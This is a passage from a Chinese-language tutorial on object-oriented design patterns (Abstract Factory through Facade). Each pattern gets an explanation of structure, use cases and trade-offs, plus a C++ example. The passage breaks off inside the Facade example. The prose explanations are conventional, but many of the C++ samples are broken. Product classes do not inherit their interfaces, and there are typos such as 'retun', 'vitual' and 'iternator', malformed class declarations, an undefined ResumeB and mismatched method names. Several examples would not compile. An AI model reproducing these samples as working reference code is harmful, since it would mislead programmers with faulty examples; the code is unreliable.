- **如果代码需要与多个不同系列的相关产品交互， 但是由于无法提前获取相关信息， 或者出于对未来扩展性的考虑， 你不希望代码基于产品的具体类进行构建， 在这种情况下， 你可以使用抽象工厂。**
  -  抽象工厂为你提供了一个接口， 可用于创建每个系列产品的对象。 只要代码通过该接口创建对象， 那么你就不会生成与应用程序已生成的产品类型不一致的产品。
- **如果你有一个基于一组抽象方法的类， 且其主要功能因此变得不明确， 那么在这种情况下可以考虑使用抽象工厂模式。**
  -  在设计良好的程序中， *每个类仅负责一件事*。 如果一个类与多种类型产品交互， 就可以考虑将工厂方法抽取到独立的工厂类或具备完整功能的抽象工厂类中。

#### 实现方式

- 以不同的产品类型与产品变体为维度绘制矩阵。
- 为所有产品声明抽象产品接口。 然后让所有具体产品类实现这些接口。
- 声明抽象工厂接口， 并且在接口中为所有抽象产品提供一组构建方法。
- 为每种产品变体实现一个具体工厂类。
- 在应用程序中开发初始化代码。 该代码根据应用程序配置或当前环境， 对特定具体工厂类进行初始化。 然后将该工厂对象传递给所有需要创建产品的类。
- 找出代码中所有对产品构造函数的直接调用， 将其替换为对工厂对象中相应构建方法的调用。

#### 代码实现

例子：生产处理器的厂商，一个工厂生产处理器A，一个生产处理器B，同时公式发展迅速，推出了很多不同种类的处理器（单核或多核），在c++实现中，就需要定义一个个的工厂类。

```c++
// 单核
class SingleCore{
public:
	virtual void show() = 0;
};

class SingleCoreA{
public:
	void show(){cout << "SingleCore A" << endl;}
};

class SingleCoreB{
public:
	void show(){cout << "SingleCore B" << endl;}
};
// 多核
class MultiCore{
public:
	virtual void show() = 0;
};
class MultiCoreA{
public:
	void show(){cout << "MultiCore A" << endl;}
};
class MultiCoreB{
public:
	void show(){cout << "MultiCore B" << endl;}
};
// 工厂
class Factory{
public:
	virtual SingleCore* CreateSingleCore() = 0;
	virtual MultiCore* CreateMultiCore() = 0;
};
// 工厂A，专门生产A处理器
class FactoryA: Factory{
public:
	SingleCore* CreateSingleCore(){return new SingleCoreA;}
	MultiCore* CreateMultiCore(){return new MultiCoreA;}
};
// 工厂B，专门生产B处理器
class FactoryB: Factory{
public:
	SingleCore* CreateSingleCore(){return new SingleCoreB;}
	MultiCore* CreateMultiCore(){return new MultiCoreB;}
};
```



#### 优缺点

优点：

- 可以确保同一工厂生成的产品相互匹配。
- 可以避免客户端和具体产品代码的耦合。
- *单一职责原则*。 你可以将产品生成代码抽取到同一位置， 使得代码易于维护。
-  *开闭原则*。 向应用程序中引入新产品变体时， 你无需修改客户端代码。

缺点：

-  由于采用该模式需要向应用中引入众多接口和类， 代码可能会比之前更加复杂。

### 生成器模式（Builder，建造者模式）

**生成器模式**是一种创建型设计模式， 使你能够分步骤创建复杂对象。 该模式允许你使用相同的创建代码生成不同类型和形式的对象。

#### 解决方案

生成器模式建议将对象构造代码从产品类中抽取出来， 并将其放在一个名为*生成器*的独立对象中。

生成器模式让你能够分步骤创建复杂对象。 生成器不允许其他对象访问正在创建中的产品。

该模式会将对象构造过程划分为一组步骤，每次创建对象时， 你都需要通过生成器对象执行一系列步骤。 重点在于你无需调用所有步骤， 而只需调用创建特定对象配置所需的那些步骤即可。

当你需要创建不同形式的产品时， 其中的一些构造步骤可能需要不同的实现。

在这种情况下， 你可以创建多个不同的生成器， 用不同方式实现一组相同的创建步骤。 然后你就可以在创建过程中使用这些生成器 （例如按顺序调用多个构造步骤） 来生成不同类型的对象。

**主管：**可以进一步将用于创建产品的一系列生成器步骤调用抽取成为单独的*主管*类。 主管类可定义创建步骤的执行顺序， 而生成器则提供这些步骤的实现。

- 严格来说， 你的程序中并不一定需要主管类。 客户端代码可直接以特定顺序调用创建步骤。 不过， 主管类中非常适合放入各种例行构造流程， 以便在程序中反复使用。
- 此外， 对于客户端代码来说， 主管类完全隐藏了产品构造细节。 客户端只需要将一个生成器与主管类关联， 然后使用主管类来构造产品， 就能从生成器处获得构造结果了。

#### 生成器模式结构

- **生成器（Builder）**：接口声明在所有类型生成器中通用的产品构造步骤。
- **具体生成器（Concrete Builder）**：提供构造过程的不同实现。具体生成器也可以构造不遵循通用接口的产品。
- **产品（Product）**：最终生成的对象。有不同生成器构造的产品无需属于同一类层次结构或者接口。
- **主管（Director）**：定义调用构造步骤的顺序，这样就可以创建和复用特定的产品和配置。
- **客户端（Client）**：必须将某个生成器对象与主管类关联。一般情况下，只需要通过主管类构造函数的参数进行一次性关联即可。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\builder.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **使用生成器模式可以避免“重叠构造函数”的出现**。
  - 生成器模式让你可以分步骤生成对象， 而且允许你仅使用必须的步骤。 应用该模式后， 你再也不需要将几十个参数塞进构造函数里了。
- **当你希望使用代码创建不同形式的产品 （例如石头或木头房屋） 时， 可使用生成器模式。**
  - 如果你需要创建的各种形式的产品， 它们的制造过程相似且仅有细节上的差异， 此时可使用生成器模式。
  - 基本生成器接口中定义了所有可能的制造步骤， 具体生成器将实现这些步骤来制造特定形式的产品。 同时， 主管类将负责管理制造步骤的顺序。
- **使用生成器构造组合树或其他复杂对象。**
  - 生成器模式让你能分步骤构造产品。 你可以延迟执行某些步骤而不会影响最终产品。 你甚至可以递归调用这些步骤， 这在创建对象树时非常方便。
  - 生成器在执行制造步骤时， 不能对外发布未完成的产品。 这可以避免客户端代码获取到不完整结果对象的情况。

#### 实现方法

- 清晰地定义通用步骤， 确保它们可以制造所有形式的产品。 否则你将无法进一步实施该模式。
- 在基本生成器接口中声明这些步骤。
- 为每个形式的产品创建具体生成器类， 并实现其构造步骤。
- 考虑创建主管类。 它可以使用同一生成器对象来封装多种构造产品的方式。
- 客户端代码会同时创建生成器和主管对象。 
- 只有在所有产品都遵循相同接口的情况下， 构造结果可以直接通过主管类获取。 否则， 客户端应当通过生成器获取构造结果。

#### 代码实现

例子：以建造小人为例

```
class Builder{
public:
	virtual void BuildHead(){}
	virtual void BuildBody(){}
	virtual void BuildLeftArm(){}
	virtual void BuildRightArm(){}
	virtual void BuildLeftLeg(){}
	virtual void BuildRightLeg(){}
};
class ThinBuilder: Builder{
public:
	void BuildHead(){cout << "Build Thin Head" << endl;}
	void BuildBody(){cout << "Build Thin Body" << endl;}
	void BuildLeftArm(){cout << "Build Thin LeftArm" << endl;}
	void BuildRightArm(){cout << "Build Thin RightArm" << endl;}
	void BuildLeftLeg(){cout << "Build Thin LeftLeg" << endl;}
	void BuildRightLeg(){cout << "Build Thin RightLeg" << endl;}
};
class FatBuilder: Builder{
public:
	void BuildHead(){cout << "Build Fat Head" << endl;}
	void BuildBody(){cout << "Build Fat Body" << endl;}
	void BuildLeftArm(){cout << "Build Fat LeftArm" << endl;}
	void BuildRightArm(){cout << "Build Fat RightArm" << endl;}
	void BuildLeftLeg(){cout << "Build Fat LeftLeg" << endl;}
	void BuildRightLeg(){cout << "Build Fat RightLeg" << endl;}
};
class Director{
private:
	Builder* m_pBuilder;
public:
	Director(Builder* builder){m_pBuilder = builder;}
	void Create(){
		m_pBuilder->BuildHead();
		m_pBuilder->BuildBody();
		m_pBuilder->BuildLeftArm();
		m_pBuilder->BuildRightArm();
		m_pBuilder->BuildLeftLeg();
		m_pBuilder->BuildRightLeg();
	}
};

// 客户端使用
int main(){
	ThinBuilder thin;
	Director director(&thin);
	director.Create();
	retun 0;
}
```

#### 优缺点

优点：

- 可以分步创建对象，暂缓创建步骤或者递归运行创建步骤
- 生成不同形式的产品时，可以复用相同的制造代码
- 单一职责原则。可以将复杂构造代码从产品的业务逻辑中分离出来。

缺点：

- 由于该模式需要新增多个类，因此代码整体复杂程度有所增加。

### 原型模式（Clone）

**原型模式**是一种创建型设计模式， 使你能够**复制**已有对象， 而又无需使代码依赖它们所属的类。

#### 解决方案

原型模式将克隆过程委派给被克隆的实际对象。 模式为所有支持克隆的对象声明了一个通用接口， 该接口让你能够克隆对象， 同时又无需将代码和对象所属类耦合。 通常情况下， 这样的接口中仅包含一个 `克隆`方法。

其运作方式如下： 创建一系列不同类型的对象并不同的方式对其进行配置。 如果所需对象与预先配置的对象相同， 那么你只需克隆原型即可， 无需新建一个对象。

#### 原型模式结构

- **原型（Prototype）**：接口将对克隆方法进行声明。在绝大部分情况下，其中只会由一个名为clone的方法
- **具体原型（Concrete Prototype）**：将实现克隆方法。除了将原始对象的数据复制到克隆体中之外，该方法有时还需要处理克隆过程中的极端情况，例如克隆关联对象和梳理递归依赖等。
- **客户端（Client）**：可以复制实现了原型接口的任何对象。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\clone.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **如果需要复制一些对象，同时有希望代码独立于这些对象所属的具体类，可以使用原型模式。**
  - 通常出现在代码需要处理第三方代码通过接口传递过来的对象时。 即使不考虑代码耦合的情况， 你的代码也不能依赖这些对象所属的具体类， 因为你不知道它们的具体信息。
  - 原型模式为客户端代码提供一个通用接口， 客户端代码可通过这一接口与所有实现了克隆的对象进行交互， 它也使得客户端代码与其所克隆的对象具体类独立开来。
- **如果子类的区别仅在于其对象的初始化方式，那么可以使用该模式来减少子类的数量，别人创建这些子类的目的可能是为了创建特定类型的对象。**
  -  在原型模式中， 你可以使用一系列预生成的、 各种类型的对象作为原型。
  - 客户端不必根据需求对子类进行实例化， 只需找到合适的原型并对其进行克隆即可。

#### 实现方式

- 创建原型接口， 并在其中声明 `克隆`方法。 如果你已有类层次结构， 则只需在其所有类中添加该方法即可。
- 原型类必须另行定义一个以该类对象为参数的构造函数。 构造函数必须复制参数对象中的所有成员变量值到新建实体中。 如果你需要修改子类， 则必须调用父类构造函数， 让父类复制其私有成员变量值。
- 克隆方法通常只有一行代码： 使用 `new`运算符调用原型版本的构造函数。 注意， 每个类都必须显式重写克隆方法并使用自身类名调用 `new`运算符。 否则， 克隆方法可能会生成父类的对象。
- 你还可以创建一个中心化原型注册表， 用于存储常用原型。

#### 代码实现

例如：简历打印。原始的手稿相当于原型，通过复印创造出更多的新简历是原型模式的基本思想。

```c++
// 父类
class Resume{
protected:
	char* name;
public:
	Result(){}
	virtual ~Result(){}
	virtual Resume* clone(){return NULL;}
	virtual void Set(char* str){}
	virtual void Show(){}
};

class ResumeA: public Resume{
public:
	ResumeA(const char* str);
	ResumeA(const ResumeA &r);
	~ResumeA();
	ResuleA* Clone();
	void show();
};
ResumeA::ResumeA(const char* str){
	if(str == NULL){
		name = new char[1];
		name[0] = '\0';
	}
	else{
		name = new char[strlen(str)+1];
		strcpy(name, str);
	}
}
ResumeA::~ResumeA(){delete[] name;}
ResumeA::ResumeA(const Resume& r){
	name = new char[strlen(r.name)+1];
	strcpy(name, r.name);
}
ResumeA* ResumeA::Clone(){
	return new ResumeA(*this);
}
void ResumeA::Show(){
	cout << "ResumeA name:" << name << endl;
}

// 客户端
int main(){
    Resume* r1 = new ResumeA("A");
    Resume* r2 = new ResumeB("B");
    Resume* r3 = r1->Clone();
    Resume* r4 = r2->Clone();
    r1->Show();r2->Show();
    delete r1; delete r2;
    r1 = r2 = NULL;
    // 深拷贝对于r3，r4无影响
    r3->Show(); r4->Show();
    delete r3; delete r4;
    r3 = r4 = NULL;
    return 0;
}
```

#### 优缺点

优点：

- 可以克隆对象，而无需与他们所属的具体类相耦合
- 可以克隆预生成原型，避免反复运行初始化代码
- 可以更方便生成复杂对象
- 可以用继承以外的方法来处理复杂对象的不同配置

缺点：

- 克隆包含循环引用的复杂对象可能非常复杂。

## 结构型模型

### 适配器模型（Adapter，Wrapper）

**适配器模式**是一种结构型设计模式， 它能使接口不兼容的对象能够相互合作。

#### 解决方案

- 可以创建一个*适配器*。 这是一个特殊的对象， 能够转换对象接口， 使其能与其他对象进行交互。
- 适配器模式通过封装对象将复杂的转换过程隐藏于幕后。 被封装的对象甚至察觉不到适配器的存在。 例如， 你可以使用一个将所有数据转换为英制单位 （如英尺和英里） 的适配器封装运行于米和千米单位制中的对象。
- 适配器不仅可以转换不同格式的数据， 其还有助于采用不同接口的对象之间的合作。 
- 有时你甚至可以创建一个双向适配器来实现双向转换调用。

#### 适配器模式结构

**对象适配器：**

- **客户端（Client）**：包含当前程序业务逻辑的类
- **客户端接口（Client Interface）**：描述了其他类与客户端代码合作时必须遵循的协议。
- **服务（Service）**：客户端与其接口不兼容，因此无法直接调用其功能。
- **适配器（Adapter）**：一个可以同时与客户端和服务端交互的类：他在实现客户端接口的同时封装了服务对象。适配器接受客户端通过适配器接口发起的调用，并将其转换为是用于被封装服务对象的调用。
- 客户端的代码只需通过接口与适配器交互即可。因此，可以向程序中添加新类型的适配器而无需修改已有代码。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\adapter.png" alt="img" style="zoom:80%;" />
</div>

**类适配器：**

- **类适配器**不需要封装任何对象，因为他同时继承了客户端和服务的行为。适配功能在重写的方法中完成。最后生成的适配器可以替代已有的客户端类进行使用。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\adapter2.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **当希望使用某个类，但是其接口与其他代码不兼容时，可以使用适配器类。**
  - 适配器模式允许创建一个中间层类，其可做为代码与遗留类、第三方类后者提供怪异接口的类之间的转换器。
- **如果需要复用这样一些类，他们处于同一个继承体系，并且他们又有了额外的一些共同的方法，但是这些共同的方法不是所有在这一继承体系中的子类所具有的共性。**
  - 你可以扩展每个子类， 将缺少的功能添加到新的子类中。 但是， 你必须在所有新子类中重复添加这些代码， 这样会使得代码有坏味道。

#### 实现方式

- 确保至少有两个类的接口不兼容：
  - 一个无法修改 （通常是第三方、 遗留系统或者存在众多已有依赖的类） 的功能性*服务*类。
  - 一个或多个将受益于使用服务类的*客户端*类。
- 声明客户端接口， 描述客户端如何与服务交互。
- 创建遵循客户端接口的适配器类。 所有方法暂时都为空。
- 在适配器类中添加一个成员变量用于保存对于服务对象的引用。 通常情况下会通过构造函数对该成员变量进行初始化， 但有时在调用其方法时将该变量传递给适配器会更方便。
- 依次实现适配器类客户端接口的所有方法。 适配器会将实际工作委派给服务对象， 自身只负责接口或数据格式的转换。
- 客户端必须通过客户端接口使用适配器。 这样一来， 你就可以在不影响客户端代码的情况下修改或扩展适配器。

#### 代码实现

STL中就用到了适配器模式。STL中实现了一种数据结构为双端队列（deque），支持前后两端的插入和删除。STL实现栈和队列时，没有从头开始定义他们，而是直接使用双端队列实现的。这里双端队列就扮演了适配器的角色。队列用到了他的后端插入，前端删除。栈用到了后端插入，后端删除。

```
// 双端队列
class Deque{
public:
	void push_back(int x){cout << "deque push_back" << endl;}
	void push_front(int x){cout << "deque push_front" << endl;}
	void pop_back(){cout << "deque pop_back" << endl;}
	void pop_front(){cout << "deque pop_front" << endl;}
};
// 顺序容器
class Sequence{
public:
	virtual void push(int x) = 0;
	virtual void pop() = 0;
};
// 栈
class Stack::Sequence{
public:
	void push(int x){deque.push_back(x);}
	void pop(){deque.pop_back();}
private:
	Deque deque;
};
// 队列
class Queue::Sequence{
public:
	void push(int x){deque.push_back(x);}
	void pop(){deque.pop_front();}
private:
	Deque deque;
};

int main(){
	Sequence *s1 = new Stack();
	Sequence *s2 = new Queue();
	s1->push(1);s1->pop();
	s2->push(2);s2->pop();
	delete s1; delete s2;
	s1 = s2 = NULL:
	return 0;
}
```

#### 优缺点

优点：

- _单一职责原则_你可以将接口或数据转换代码从程序主要业务逻辑中分离。
-  *开闭原则*。 只要客户端代码通过客户端接口与适配器进行交互， 你就能在不修改现有客户端代码的情况下在程序中添加新类型的适配器。

缺点：

- 代码整体复杂度增加， 因为你需要新增一系列接口和类。 有时直接更改服务类使其与其他代码兼容会更简单。

### 桥接模式（Bridge）

**桥接模式**是一种结构型设计模式， 可将一个大类或一系列紧密相关的类拆分为抽象和实现两个独立的层次结构， 从而能在开发时分别使用。

#### 解决方案

问题的根本原因是我们试图在两个独立的维度—**形状与颜色**—上扩展形状类。 这在处理类继承时是很常见的问题。

桥接模式通过将继承改为组合的方式来解决这个问题。 具体来说， 就是抽取其中一个维度并使之成为独立的类层次， 这样就可以在初始类中引用这个新层次的对象， **从而使得一个类不必拥有所有的状态和行为**。

#### 桥接模式结构
- **抽象部分（Abstraction）**：提供高层控制逻辑，依赖于完成底层实际工作的实现对象。
- **实现部分（Implementation）**：为所有具体实现声明通用接口。抽象部分仅能通过在这里声明的方法与实现对象交互。
- **具体实现（Concrete Implementations）**：包括特定于平台的代码。
- **精确抽象（Refined Abstration）**：提供控制逻辑的变体。于其父类一样，通过通用实现接口与不同的实现进行交互。
- 通常情况下，客户端仅关心如何与抽象部分合作。但是，客户端需要将抽象对象与一个实现对象连接起来。
<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\bridge.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景
- **如果你想要拆分或重组一个具有多重功能的庞杂类 （例如能与多个数据库服务器进行交互的类）， 可以使用桥接模式。**
  - 类的实现行数越多，弄清其运行方式就越困难，对齐进行修改所花费的时间就越长。桥接模式可以将庞杂类拆分为几个类层次结构。 此后， 你可以修改任意一个类层次结构而不会影响到其他类层次结构。 这种方法可以简化代码的维护工作， 并将修改已有代码的风险降到最低。
- **如果你希望在几个独立维度上扩展一个类， 可使用该模式。**
  - 桥接建议将每个维度抽取为独立的类层次。 初始类将相关工作委派给属于对应类层次的对象， 无需自己完成所有工作。
- **如果你需要在运行时切换不同实现方法， 可使用桥接模式。**

#### 实现方式
- 明确类中独立的维度。 独立的概念可能是： 抽象/平台， 域/基础设施， 前端/后端或接口/实现。
- 了解客户端的业务需求， 并在抽象基类中定义它们。
- 确定在所有平台上都可执行的业务。 并在通用实现接口中声明抽象部分所需的业务。
- 为你域内的所有平台创建实现类， 但需确保它们遵循实现部分的接口。
- 在抽象类中添加指向实现类型的引用成员变量。 抽象部分会将大部分工作委派给该成员变量所指向的实现对象。
- 如果你的高层逻辑有多个变体， 则可通过扩展抽象基类为每个变体创建一个精确抽象。
- 客户端代码必须将实现对象传递给抽象部分的构造函数才能使其能够相互关联。 此后， 客户端只需与抽象对象进行交互， 无需和实现对象打交道。

#### 代码实现
例子：考虑装操作系统，有多种配置的计算机，同样有多款操作系统，如何使用桥接模式呢？可以将操作系统和计算机分别抽象出来，减少他们的耦合度。
```
// 操作系统
class OS{
public:
  virtual void InstallOS_Imp()
};
class WindowOS: public OS{
public:
  void InstallOS_Imp(){cout << "Install Window OS" << endl;}
};
class LinuxOS: public OS{
public:
  void InstallOS_Imp(){cout << "Install Linux OS" << endl;}
};
class MacOS: public OS{
public:
  void InstallOS_Imp(){cout << "Install Mac OS" << endl;}
};

// 计算机
class Computer{
public:
  vitual void InstallOS(OS *os){}
};
class DellComputer: public Computer{
public:
  void Install(OS *os){os->InstallOS_Imp();}
};
class HPComputer: public Computer{
public:
  void Install(OS *os){os->InstallOS_Imp();}
};
class AppleComputer: public Computer{
public:
  void Install(OS *os){os->InstallOS_Imp();}
};

int main(){
  OS *os1 = new WindowOS();
  OS *os2 = new LinuxOS();
  OS *os3 = new MacOS();
  Computer *computer1 = new AppleComputer();
  computer1->Install(os3);
  return 0;
}
```

#### 优缺点
优点：
- 你可以创建与平台无关的类和程序。
- 客户端代码仅与高层抽象部分进行互动，不会接触到平台的详细信息。
- 开闭原则。 你可以新增抽象部分和实现部分， 且它们之间不会相互影响。
- 单一职责原则。 抽象部分专注于处理高层逻辑， 实现部分处理平台细节。
缺点：
- 对高内聚的类使用该模式可能会让代码更加复杂。

### 组合模式(Composite)
**组合模式**是一种结构性设计模式，你可以使用它将对象组合成树状结构，并且能像使用独立对象一样使用它们。

#### 解决方案
组合模式建议使用一个通用接口来与`产品和盒子`进行交互， 并且在该接口中声明一个计算总价的方法。
该方式的最大优点在于你无需了解构成树状结构的对象的具体类。 

#### 组合模式结构
- **组件（Component）**：接口描述了树中简单项目和复杂项目所共有的操作。
- **叶节点（Leaf）**：是树的基本结构，它不包含子项目。一般情况下，叶节点最终会完成大部分的实际工作，因为他们无法将工作指派给其他部分。
- **容器（Container）**：是包含叶节点或者其他容器等子项目的单位。容器不知道其子项目所属的具体类，他只通过通用的组件接口与其子项目交互。
- **客户端（Client）**：通过组件接口与所有项目交互。因此客户端能以相同方式与树状结构中的简单或者复杂项目交互。
<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\composite.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景
- **如果你需要实现树状对象结构，可以使用组合模式。**
  - 组合模式为你提供了两种共享公共接口的基本元素类型： 简单叶节点和复杂容器。 容器中可以包含叶节点和其他容器。 这使得你可以构建树状嵌套递归对象结构。
- **如果你希望客户端代码以相同方式处理简单和复杂元素， 可以使用该模式。**
  - 组合模式中定义的所有元素共用同一个接口。 在这一接口的帮助下， 客户端不必在意其所使用的对象的具体类。

#### 实现方式
- 确保应用的核心模型能够以树状结构表示。 尝试将其分解为简单元素和容器。 记住， 容器必须能够同时包含简单元素和其他容器。
- 声明组件接口及其一系列方法， 这些方法对简单和复杂元素都有意义。
- 创建一个叶节点类表示简单元素。 程序中可以有多个不同的叶节点类。
- 创建一个容器类表示复杂元素。 在该类中， 创建一个数组成员变量来存储对于其子元素的引用。 该数组必须能够同时保存叶节点和容器， 因此请确保将其声明为组合接口类型。
  - 实现组件接口方法时， 记住容器应该将大部分工作交给其子元素来完成。
- 最后， 在容器中定义添加和删除子元素的方法。

#### 代码实现
例子：比如一个集团公司，他有一个母公司，下设很多家子公司。不管是母公司或者子公司，都有各自的财务部，人力部等。对于母公司来说，不论是子公司，还是直属的财务部，人力部等，都是他的部门。
```
class Company{
public:
  Company(string name){m_name = name;}
  virtual ~Company(){}
  virtual void Add(Company *pCom){}
  virtual void Show(int depth){}
protected:
  string m_name;
};
// 具体的公司
class ConcreteCompany: public Company{
public:
  ConcreteCompany(string name): Company(name){}
  virtual ~ConcreteCompany(){}
  void Add(Company *pCon){m_listCompany.push_back(pCom);}
  void Show(int depth){
    for(int i = 0; i < depth; i++)
      cout << "-";
    cout << m_name<<endl;
    list<Company*>::iternator iter = m_listCompany.begin();
    for(; iter != m_listCompany.end(); iter++)
      (*iter)->Show(depth+2);
  }
private:
  list<Company*> m_listCompany;
};

//具体的部门
class FinaneDepartment: public Company{
public:
  FinanceDepartment(string name): Company(name){}
  vitrual ~FinanceDepartment(){}
  virtual void Show(int depth){
    for(int i = 0; i < depth; i++)
      cout << "-";
    cout << m_name << endl;
  }
};
class HRDepartment: public Compnay{
public:
    HRDepartment(string name): Company(name){}
  vitrual ~HRDepartment(){}
  virtual void Show(int depth){
    for(int i = 0; i < depth; i++)
      cout << "-";
    cout << m_name << endl;
  }
}
```

#### 优缺点
优点：
-  你可以利用多态和递归机制更方便地使用复杂树结构。
-  开闭原则。 无需更改现有代码， 你就可以在应用中添加新元素， 使其成为对象树的一部分。
缺点：
- 对于功能差异较大的类，提供公共接口或许会有困难。在特定情况下，你需要过度一般化组件接口，使其变得令人难以理解。

### 装饰模式（Wrapper）
装饰模式是一种结构型设计模式， 允许你通过将对象放入包含行为的特殊封装对象中来为原对象绑定新的行为。

#### 解决方案
- 封装器是装饰模式的别称，这个称谓明确的表达了该模式的主要思想。“封装器”是一个能与其他“目标”对象连接的对象。封装器包含与目标对象相同的一系列方法， 它会将所有接收到的请求委派给目标对象。 但是， 封装器可以在将请求委派给目标前后对其进行处理， 所以可能会改变最终结果。

#### 装饰模式结构
- **部件（Component）**：声明封装器和被封装对象的共用接口。
- **具体部件（Concrete Component）**：是被封装对象所属的类。它定义了基础行为，但是装饰类可以改变这些行为。
- **基础装饰（Base Decorator）**：拥有一个指向被封装对象的引用成员变量。该变量的类型应当被声明为通用部件接口，这样他就可以引用具体的部件和装饰。
- **具体装饰类（Concrete Decorator）**：定义了可动态添加到部件的额外行为。具体装饰类会重写装饰基类的方法，并在调用父类方法之前或者之后进行额外的行为。
- **客户端（Client）**：可以使用多层装饰来封装不见，只要它能使用通用 接口与所有对象互动即可。
<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\wrapper.png" alt="img" style="zoom:80%;" />
</div>
#### 应用场景

- **如果希望在无需修改代码的情况下即可使用对象，且希望在运行时为对象新增额外的行为，可以使用装饰模式。**
  - 装饰能将业务逻辑组织为层次结构， 你可为各层创建一个装饰， 在运行时将各种不同逻辑组合成对象。 由于这些对象都遵循通用接口， 客户端代码能以相同的方式使用这些对象。
- **如果用继承来扩展对象行为的方案难以实现或者根本不可行，你可以使用该模式。**
  - 复用最终类已有行为的唯一方法是使用装饰模式： 用封装器对其进行封装。

#### 实现方式

- 确保业务逻辑可用一个基本组件及多个额外可选层次表示。
- 找出基本组件和可选层次的通用方法。 创建一个组件接口并在其中声明这些方法。
- 创建一个具体组件类， 并定义其基础行为。
- 创建装饰基类， 使用一个成员变量存储指向被封装对象的引用。 该成员变量必须被声明为组件接口类型， 从而能在运行时连接具体组件和装饰。 装饰基类必须将所有工作委派给被封装的对象。
- 确保所有类实现组件接口。
- 将装饰基类扩展为具体装饰。 具体装饰必须在调用父类方法 （总是委派给被封装对象） 之前或之后执行自身的行为。
- 客户端代码负责创建装饰并将其组合成客户端所需的形式。

#### 代码实现

例如：一个手机，允许为他添加特性，比如增加挂件，手机贴膜等。一种灵活的设计方式是，将手机嵌入到另一个对象中，有这个对象完成特性的添加，我们将这个嵌入的对象为装饰。

```C++
class Phone{
public:
	Phone(){}
	virutal ~Phone(){}
	virutal void ShowDecorate(){}
};

class iPhone: public Phone{
private:
	string m_name;
public:
	iPhome(String name): m_name(name){}
	~iPhone(){}
	void ShowDecorate(){cout << m_name << "的装饰" << endl;}
};

class NokiaPhone: public Phone{
private:
	string m_name;
public:
	NokiaPhone(string name): m_name(name){}
	~NokiaName(){}
	void ShowDecorate(){cout << m_name<< "的装饰" << endl;}
};

// 装饰类
class DecoratorPhone: public Phone{
private:
	Phone *m_phone;
public:
	DecoratorPhone(Phone *phone): m_phone(phone){}
	virtual void ShowDecorate(){m_phone->ShowDecorate();}
};

class DecoratorPhoneA: public DecoratorPhone{
public:
	DecoratorPhoneA(Phone *phone): DecoratorPhone(phone){}
	void ShowDecorate(){DecoratorPhone::ShowDecorate(); AddDecorate();}
private:
	void AddDecorate(){cout << "增加挂件" << endl;}
};

class DecoratePhoneB: public DecoratorPhone{
public:
	DecoratorPhoneB(Phone *phone): DecoratorPhone(phone){}
	void ShowDecorate(){DecoratorPhone::ShowDecorate(); AddDecorate();}
private:
	void AddDecorate(){cout << "屏幕贴膜" << endl;}
};

int main(){
    shared_ptr<Phone> phone1(new NokiaPhone("6300"));
    shared_ptr<Phone> dpa(new DecoratorPhoneA(phone1));	// 装饰，增加挂件
    shared_ptr<Phone> dpb(new DecoratorPhoneB(dpa));	// 装饰，屏幕贴膜
    dpb->ShowDecorate();
    return 0;
}
```

#### 优缺点

优点：

- 你无需创建新子类即可扩展对象的行为。
- 你可以在运行时添加或删除对象的功能。
- 你可以用多个装饰封装对象来组合几种行为。
-  *单一职责原则*。 你可以将实现了许多不同行为的一个大类拆分为多个较小的类。

缺点：

- 在封装器栈中删除特定封装器比较困难。
- 实现行为不受装饰栈顺序影响的装饰比较困难。
- 各层的初始化配置代码看上去可能会很糟糕。

### 外观模式（Facade）

**外观模式**是一种结构性设计模式，能为程序库、框架或者其他复杂类提供一个简单的接口。

#### 解决方案

外观类为包含许多活动部件的复杂子系统提供一个简单的接口。与直接调用子系统相比，外观提供的功能可能比较有限，但它却包含了客户端真正关心的功能。

如果你的程序需要与包含几十种功能的复杂库整合， 但只需使用其中非常少的功能， 那么使用外观模式会非常方便。

#### 外观模式结构

- **外观（Facade）**：提供了一种访问特定子系统功能的便捷方式。其了解如何重定向客户端请求，知晓如何操作一切活动部件。
- **创建附加外观（Additional Facade）**：可以避免多种不相关的功能都污染同一个外观，使其变成有一个复杂结构。客户端和其他外观都可以使用附加外观。
- **复杂子系统（Complext subsystem）**：由数十个不同对象构成。如果要用这些对象完成有意义的工作，必须深入了解子系统的实现细节。子系统类不会意识到外观的存在，他们在系统内运作并且相互之间可直接进行交互。
- **客户端（Client）**：使用外观代替对子系统对象的直接调用。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\facade.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **如果你需要一个指向复杂子系统的直接接口， 且该接口的功能有限， 则可以使用外观模式。**
  - 子系统通常会随着时间的推进变得越来越复杂。为了解决这个问题， 外观将会提供指向子系统中最常用功能的快捷方式， 能够满足客户端的大部分需求。
- **如果需要将子系统组织为多层结构， 可以使用外观。**
  - 创建外观来定义子系统中各层次的入口。 你可以要求子系统仅使用外观来进行交互， 以减少子系统之间的耦合。

#### 实现方式

- 考虑能否在现有子系统的基础上提供一个更简单的接口。 如果该接口能让客户端代码独立于众多子系统类， 那么你的方向就是正确的。
- 在一个新的外观类中声明并实现该接口。 外观应将客户端代码的调用重定向到子系统中的相应对象处。 如果客户端代码没有对子系统进行初始化， 也没有对其后续生命周期进行管理， 那么外观必须完成此类工作。
- 如果要充分发挥这一模式的优势， 你必须确保所有客户端代码仅通过外观来与子系统进行交互。 此后客户端代码将不会受到任何由子系统代码修改而造成的影响， 比如子系统升级后， 你只需修改外观中的代码即可。
- 如果外观变得过于臃肿， 你可以考虑将其部分行为抽取为一个新的专用外观类。

#### 代码实现

例子：编译器需要经过4个步骤：词法分析，语法分析，中间代码生成，机器码生成。对于这个系统就可以使用外观模式。

```c++
class Sacnner{
public:
	void Scan(){cout << "词法分析" << endl;}
};
class Parser{
public:
	void Parse(){cout << "语法分析" << endl;}
};
class GenMidCode{
public:
	void GenCode(){cout << "中间代码生成" << endl;}
};
class GenMachineCode{
public:
	void GenCode(){cout << "机器码生成" << endl;}
};

class Compile{
public:
	void Run(){
		Scanner scanner;
		Parser parser;
